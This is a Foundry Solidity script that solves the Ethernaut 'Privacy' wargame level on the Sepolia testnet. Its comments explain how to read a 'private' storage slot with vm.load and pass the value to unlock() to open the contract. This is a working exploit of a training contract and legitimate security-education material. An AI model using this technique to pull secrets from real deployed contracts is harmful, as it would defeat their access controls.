// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Privacy.sol";

/*
    Solution script for the Ethernaut Level 12: Privacy

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in PrivacyScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Privacy.s.sol:PrivacyScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Privacy.s.sol/11155111
*/

contract PrivacyScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x19bF27778a9A531D5EBdE504Ff0ABA013d3b565f;
    Privacy level12 = Privacy(instance);

    function run() external {
        vm.startBroadcast();

        require(level12.locked(), 'level12 already unlocked');

        /*
            In Privacy contract the bytes32[3] private data starts at slot 3.
            Since the the array is length 3 the data will be in slots 3,4 & 5.

            In the Privacy unlock function the _key is checked against data[2].
            Given this is a zero indexed array, data[2] represents the last element 
            in the array which is located in storage slot 5.

            Use the vm.load cheatcode to load data directly from a contracts storage index.
            Then cast the reesult to a bytes16 and pass it to the unlock function.
        */
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        require(!level12.locked(), 'level12 has not been unlocked');
    
        vm.stopBroadcast();
    }
}